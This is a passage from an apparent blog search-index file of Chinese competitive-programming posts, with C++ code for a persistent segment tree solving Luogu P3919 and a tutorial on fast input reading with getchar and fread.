Transform（快速沃尔什变换）</a>  </p><p><a href="//www.cnblogs.com/mlystdcall/p/6219421.html">简易CDQ分治教程&amp;学习笔记</a><br><a href="//www.cnblogs.com/mlystdcall/p/6232324.html">四维偏序(CDQ套CDQ)</a></p>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P3919 【模板】可持久化数组（可持久化线段树/平衡树）</title>
      <link href="/2018/02/20/%E6%B4%9B%E8%B0%B7P3919%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E6%95%B0%E7%BB%84/"/>
      <url>/2018/02/20/%E6%B4%9B%E8%B0%B7P3919%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href="//www.luogu.org/problemnew/show/P3919">https://www.luogu.org/problemnew/show/P3919</a></p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>维护一个长度为N的数组，支持如下几种操作：  </p><ol><li>在某个历史版本上修改某一个位置上的值  </li><li>访问某个历史版本上的某一位置的值<br>此外，每进行一次操作（对于操作2，即为生成一个完全一样的版本，不作任何改动），就会生成一个新的版本。版本编号即为当前操作的编号（从1开始编号，版本0表示初始状态数组）</li></ol><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先感谢来自<a href="https://www.luogu.org/space/show?uid=2978">@zcysky</a>的模板。写的非常漂亮，封装也很精致。<br>这题是裸题，于是直接上模板就行了。注意此题输入数据大，需要读入优化。<br>关于可持久化线段树的介绍与总结，之后把坑填上。  </p><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">1000005</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> a[N],n,q,rt[N*<span class="number">20</span>];<span class="comment">//空间复杂度O(mlogn) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXB 50000000</span></span><br><span class="line"><span class="type">char</span> buf[MAXB],*cp=buf;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> f=<span class="number">1</span>,x=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(*cp&lt;<span class="string">&#x27;0&#x27;</span>||*cp&gt;<span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(*cp==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            f=<span class="number">-1</span>;</span><br><span class="line">        cp++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(*cp&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;*cp&lt;=<span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        x=x*<span class="number">10</span>+*cp-<span class="string">&#x27;0&#x27;</span>; </span><br><span class="line">        cp++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f*x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Persistable_Segment_Tree</span> &#123;</span><br><span class="line">    <span class="type">int</span> lc[N*<span class="number">20</span>],rc[N*<span class="number">20</span>],val[N*<span class="number">20</span>],cnt;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> &amp;o,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">        o=++cnt;</span><br><span class="line">        <span class="keyword">if</span>(l==r) &#123;</span><br><span class="line">            val[o]=a[l];</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">build</span>(lc[o],l,mid);</span><br><span class="line">        <span class="built_in">build</span>(rc[o],mid+<span class="number">1</span>,r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">ins</span><span class="params">(<span class="type">int</span> &amp;o,<span class="type">int</span> pre,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> q,<span class="type">int</span> v)</span></span>&#123;</span><br><span class="line">        o=++cnt;</span><br><span class="line">        lc[o]=lc[pre];</span><br><span class="line">        rc[o]=rc[pre];</span><br><span class="line">        val[o]=val[pre];</span><br><span class="line">        <span class="keyword">if</span>(l==r) &#123;</span><br><span class="line">            val[o]=v;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(q&lt;=mid)</span><br><span class="line">            <span class="built_in">ins</span>(lc[o],lc[pre],l,mid,q,v);</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="built_in">ins</span>(rc[o],rc[pre],mid+<span class="number">1</span>,r,q,v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> o,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> q)</span></span>&#123;<span class="comment">//类似二分的查询 </span></span><br><span class="line">        <span class="keyword">if</span>(l==r)</span><br><span class="line">            <span class="keyword">return</span> val[o];</span><br><span class="line">        <span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(q&lt;=mid)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">query</span>(lc[o],l,mid,q);</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">query</span>(rc[o],mid+<span class="number">1</span>,r,q);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;T;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fread</span>(buf,<span class="number">1</span>,MAXB,stdin);</span><br><span class="line">    n=<span class="built_in">read</span>();</span><br><span class="line">    <span class="type">int</span> m=<span class="built_in">read</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        a[i]=<span class="built_in">read</span>();</span><br><span class="line">    T.<span class="built_in">build</span>(rt[<span class="number">0</span>],<span class="number">1</span>,n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="type">int</span> pre=<span class="built_in">read</span>(),opt=<span class="built_in">read</span>(),x=<span class="built_in">read</span>();</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="number">1</span>) &#123;<span class="comment">//操作1:在版本pre的基础上将第x个数修改为v </span></span><br><span class="line">            <span class="type">int</span> v=<span class="built_in">read</span>();</span><br><span class="line">            T.<span class="built_in">ins</span>(rt[i],rt[pre],<span class="number">1</span>,n,x,v);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="number">2</span>) &#123;<span class="comment">//操作2:访问版本pre中第x个数的值 </span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,T.<span class="built_in">query</span>(rt[pre],<span class="number">1</span>,n,x));</span><br><span class="line">            rt[i]=rt[pre];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 持久化 </tag>
            
            <tag> 线段树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OI中的IO优化</title>
      <link href="/2018/02/20/OI%E4%B8%AD%E7%9A%84IO%E4%BC%98%E5%8C%96/"/>
      <url>/2018/02/20/OI%E4%B8%AD%E7%9A%84IO%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>本文主要讲述常用的2种读入优化方法。<br>输出优化很少使用，在此简单提一下：也就是把输出的东西先放进字符串，再一次性puts\printf出去。提升不大，不常用。<br>首先当然需要先知道，scanf&#x2F;printf比cin&#x2F;cout快不少。<br>读入优化： </p><ol><li>getchar<br>使用getchar一个一个读入字符，转化成数字。比scanf快一些。<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> f=<span class="number">1</span>,x=<span class="number">0</span>;<span class="comment">//f是正负的标识</span></span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        ch=<span class="built_in">getchar</span>();</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            f=<span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;0&#x27;</span>||ch&gt;<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        x=x*<span class="number">10</span>+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=<span class="built_in">getchar</span>();</span><br><span class="line">    &#125; <span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> f*x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>2.fread  （非常快！）<br>fread将stdin里的内容读到字符串里，然后利用指针处理。<br>首先定义指针和读入的数组：  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXB 10000000</span></span><br><span class="line"><span class="comment">//定义读入最长的长度</span></span><br><span class="line">    <span class="type">char</span> buf[MAXB],*cp=buf;</span><br></pre></td></tr></table></figure>接下来是读入：  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fread</span>(buf,<span class="number">1</span>,MAXB,stdin);<span class="comment">//函数具体参数含义请善用搜索引擎</span></span><br></pre></td></tr></table></figure>最后是从中处理出数据（现在这个函数是为了处理int整型而设计）  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> f=<span class="number">1</span>,x=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(*cp&lt;<span class="string">&#x27;0&#x27;</span>||*cp&gt;<span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(*cp==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            f=<span class="number">-1</span>;</span><br><span class="line">        cp++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(*cp&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;*cp&lt;=<span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        x=x*<span class="number">10</span>+*cp-<span class="string">&#x27;0&#x27;</span>; </span><br><span class="line">        cp++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f*x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
